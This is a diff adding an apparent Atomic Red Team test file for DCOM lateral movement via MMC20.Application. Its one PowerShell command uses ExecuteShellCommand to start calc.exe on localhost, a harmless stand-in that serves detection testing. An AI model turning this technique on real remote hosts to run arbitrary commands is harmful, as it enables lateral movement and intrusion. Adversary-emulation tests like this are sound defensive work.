@@ -1,0 +1,7 @@
+#TechniqueName: Remote Services: Distributed Component Object Model
+#AtomicTestName: PowerShell Lateral Movement using MMC20
+#Language: ps1
+
+#commands
+[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+
